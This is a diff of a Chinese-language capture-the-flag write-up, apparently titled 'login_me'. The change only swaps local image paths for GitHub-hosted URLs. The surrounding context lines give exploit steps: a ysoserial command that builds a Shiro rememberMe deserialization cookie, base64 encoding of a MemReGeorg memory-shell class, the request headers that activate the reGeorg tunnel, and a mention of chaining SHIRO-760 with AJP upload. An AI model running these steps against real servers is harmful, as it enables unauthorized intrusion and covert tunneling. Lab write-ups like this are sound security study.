@@ -353,7 +353,7 @@ print(base64.b64encode(IV + encryptor.encrypt(payload)))
 python2 shiro_cookie.py `java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1_ClassLoader anything |base64 |sed ':label;N;s/\n//;b label'`
 ```
 
-![1](.\login_me\1.png)
+![1](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/login_me/1.png)
 
 编译MemReGeorg.java后使用如下命令得到其字节码的base64
 
@@ -361,17 +361,17 @@ python2 shiro_cookie.py `java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanu
 cat MemReGeorg.class|base64 |sed ':label;N;s/\n//;b label'
 ```
 
-![1](.\login_me\2.png)
+![1](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/login_me/2.png)
 
 在Cookie处填入 rememberMe=[ysoserial生成的POC]，POST包体填入classData=[MemReGeorg类字节码的base64]，注意POST中参数需要URL编码，发包
 
 
 
-![1](.\login_me\3.png)
+![1](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/login_me/3.png)
 
 然后带上X-CMD:l3yxheader头再请求页面，返回X-STATUS: OK说明reGeorg已经正常工作
 
-![1](.\login_me\4.png)
+![1](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/login_me/4.png)
 
 reGeorg客户端也需要修改一下，原版会先GET请求一下网页判断是否是reGeorg的jsp页面，由于这里是添加了一个filter，正常访问网页是不会有变化的，只有带上相关头才会进入reGeorg代码，所以需要将客户端中相关的验证去除
 
@@ -379,13 +379,13 @@ reGeorg客户端也需要修改一下，原版会先GET请求一下网页判断�
 
 在askGeorg函数最后改为return True即可
 
-![1](.\login_me\5.png)
+![1](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/login_me/5.png)
 
-![1](.\login_me\6.png)
+![1](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/login_me/6.png)
 
 需要配置全局代理，不然会本地DNS解析，无法访问到目标
 
-![1](.\login_me\7.png)
+![1](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/login_me/7.png)
 
 结合SHIRO-760漏洞，通过ajp上传文件：
 
@@ -458,7 +458,7 @@ for d in data:
 
 ```
 
-![1](.\login_me\8.png)
+![1](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/login_me/8.png)
 
 
 
